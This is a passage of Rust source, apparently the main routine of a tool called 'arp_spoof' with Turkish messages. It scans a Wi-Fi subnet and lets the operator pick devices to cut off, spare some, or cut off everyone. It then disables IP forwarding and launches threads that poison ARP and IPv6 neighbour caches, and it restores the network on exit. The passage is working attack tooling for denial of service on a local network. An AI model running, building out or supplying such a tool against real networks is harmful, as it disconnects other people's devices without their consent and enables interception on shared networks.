        eprintln!("❌ Root yetkisi veya CAP_NET_RAW gerekli!");
        eprintln!(
            "   sudo ile çalıştır veya: sudo setcap cap_net_raw+ep ./target/release/arp_spoof"
        );
        std::process::exit(1);
    }

    print_welcome();

    let mut net = match detect_network() {
        Some(n) => n,
        None => {
            eprintln!("❌ Ağ yapılandırması tespit edilemedi!");
            return;
        }
    };

    if !net.interface.name.starts_with("wl") {
        println!(
            "⚠️  UYARI: {} Wi-Fi arayüzü gibi görünmüyor.",
            net.interface.name
        );
        println!("   Wi-Fi için wlan0/wlp* beklenir. Yine de devam ediliyor...\n");
        thread::sleep(Duration::from_millis(1500));
    }

    let config = Config {
        read_timeout: Some(Duration::from_millis(50)),
        promiscuous: true,
        ..Default::default()
    };

    let (mut tx, mut rx) = match datalink::channel(&net.interface, config) {
        Ok(Channel::Ethernet(tx, rx)) => (tx, rx),
        Ok(_) => {
            eprintln!("❌ Desteklenmeyen datalink kanal tipi!");
            return;
        }
        Err(e) => {
            eprintln!("❌ Datalink kanalı açılamadı: {}", e);
            return;
        }
    };

    let gw_mac = match resolve_gateway_mac(
        &mut tx,
        &mut rx,
        net.local_mac,
        net.local_ip,
        net.gateway_ip,
    ) {
        Some(m) => m,
        None => {
            eprintln!("❌ Gateway MAC adresi çözülemedi!");
            return;
        }
    };
    net.gateway_mac = gw_mac;

    if let Some(local_v6) = net.local_ipv6 {
        println!("🔍 IPv6 router aranıyor...");
        match resolve_gateway_ipv6(&mut tx, &mut rx, net.local_mac, local_v6) {
            Some(gw_v6) => {
                println!("✅ IPv6 router bulundu: {}", gw_v6);
                net.gateway_ipv6 = Some(gw_v6);
            }
            None => {
                println!("⚠️  IPv6 router bulunamadı. IPv6 spoof devre dışı kalacak.");
            }
        }
    } else {
        println!("⚠️  Bu arayüzde IPv6 link-local adres yok. IPv6 spoof devre dışı.");
    }

    // --- Saldırı modu seçimi (henüz hiç spoof paketi gönderilmedi) ---
    let attack_mode = ask_attack_mode();

    let net = Arc::new(net);
    let shared = Arc::new(Shared::new());
    let tx = Arc::new(Mutex::new(tx));

    {
        let shared = shared.clone();
        ctrlc::set_handler(move || {
            let _ = SHUTDOWN_START.set(Instant::now());
            shared.running.store(false, Ordering::SeqCst);
            eprintln!("[DEBUG +0.000s] Ctrl+C received, running=false set");
            let _ = std::io::stderr().flush();
        })
        .expect("Ctrl+C handler kaydedilemedi");
    }

    // "Sadece kes" hedefi: yönlendirme açıksa kapat (çıkışta geri alınır).
    let mut fwd_guard = ForwardGuard::enforce();

    // Cihaz listesini toplamak için reader şart; seçim öncesi hiç spoof yok.
    let _reader_handle = spawn_reader(rx, shared.clone(), net.clone(), tx.clone());

    println!("🔍 Ağdaki cihazlar taranıyor, lütfen bekle...");
    scan_full_subnet(
        &tx,
        &net,
        Duration::from_millis(INITIAL_SCAN_WAIT_MS),
        &shared,
    );

    match attack_mode {
        AttackMode::Single => {
            match choose_targets(
                &shared,
                &tx,
                &net,
                "Keseceğin cihazlara ↑/↓ ile gel, Boşluk ile seç, Enter ile onayla",
            ) {
                Some(targets) => {
                    let macs: Vec<MacAddr> = targets.iter().map(|(_, m)| *m).collect();
                    shared.set_pinned(targets.clone());
                    // Listeyi sadece seçilen cihazlara indir; başka cihaz takip edilmesin.
                    if let Ok(mut t) = shared.targets.lock() {
                        t.retain(|_, m| macs.contains(m));
                    }
                    if let Ok(mut t6) = shared.targets_v6.lock() {
                        t6.clear();
                    }
                    println!();
                    println!("🎯 {} hedef kilitlendi:", targets.len());
                    for (ip, mac) in &targets {
                        println!("   • {} ({})", ip, mac);
                    }
                    println!("   Saldırı yalnızca bu cihazlara uygulanacak.");
                    thread::sleep(Duration::from_millis(1500));
                }
                None => {
                    println!();
                    println!("👋 Hedef seçilmedi, çıkılıyor.");
                    fwd_guard.restore();
                    let _ = std::io::stdout().flush();
                    let _ = std::io::stderr().flush();
                    unsafe { libc::_exit(0) }
                }
            }
        }
        AttackMode::ExceptOne => {
            match choose_targets(
                &shared,
                &tx,
                &net,
                "Korunacak cihazlara ↑/↓ ile gel, Boşluk ile seç, Enter ile onayla",
            ) {
                Some(targets) => {
                    let macs: Vec<MacAddr> = targets.iter().map(|(_, m)| *m).collect();
                    shared.set_excluded(targets.clone());
                    // Korunan cihazları hedef listelerinden çıkar; hiç zehirlenmesin.
                    if let Ok(mut t) = shared.targets.lock() {
                        t.retain(|_, m| !macs.contains(m));
                    }
                    if let Ok(mut t6) = shared.targets_v6.lock() {
                        t6.retain(|_, m| !macs.contains(m));
                    }
                    println!();
                    println!("🛡️  {} korunan cihaz:", targets.len());
                    for (ip, mac) in &targets {
                        println!("   • {} ({})", ip, mac);
                    }
                    println!("   Bu cihazlar hariç tüm ağ kesilecek.");
                    thread::sleep(Duration::from_millis(1500));
                }
                None => {
                    println!();
                    println!("👋 Cihaz seçilmedi, çıkılıyor.");
                    fwd_guard.restore();
                    let _ = std::io::stdout().flush();
                    let _ = std::io::stderr().flush();
                    unsafe { libc::_exit(0) }
                }
            }
        }
        AttackMode::Everyone => {
            let found4 = shared.targets.lock().map(|g| g.len()).unwrap_or(0);
            let found6 = shared.targets_v6.lock().map(|g| g.len()).unwrap_or(0);
            println!(
                "✅ Başlangıç taraması: {} IPv4, {} IPv6 cihaz",
                found4, found6
            );
            thread::sleep(Duration::from_millis(1000));
        }
    }

    let _display_handle = spawn_display(shared.clone(), net.clone());
    let _sender_handle = spawn_spoof_sender(tx.clone(), shared.clone(), net.clone());
    let _bg_handle = if attack_mode == AttackMode::Single {
        None
    } else {
        Some(spawn_background_scanner(
            tx.clone(),
            shared.clone(),
            net.clone(),
        ))
    };

    while shared.running.load(Ordering::SeqCst) {
        thread::sleep(Duration::from_millis(100));
    }

    dbg("main loop exited");

    // Thread'lerin durmasını bekle
    let t_wait = Instant::now();
    let deadline = Instant::now() + Duration::from_secs(3);
    while shared.alive_count() > 0 && Instant::now() < deadline {
        thread::sleep(Duration::from_millis(20));
    }
    dbg(&format!(
        "thread wait done in {:?}, alive: {} ({})",
        t_wait.elapsed(),
        shared.alive_count(),
        shared.alive_report()
    ));

    thread::sleep(Duration::from_millis(100));
    dbg("pre-restore sleep 100ms done");

    restore_network(&tx, &shared, &net);

    dbg("restore_network returned");

    // `_exit` destructor çalıştırmaz; yönlendirme ayarını açıkça geri al.
    fwd_guard.restore();

    println!("👋 Uygulama kapandı");
    let _ = std::io::stdout().flush();
    let _ = std::io::stderr().flush();
    unsafe { libc::_exit(0) };
}
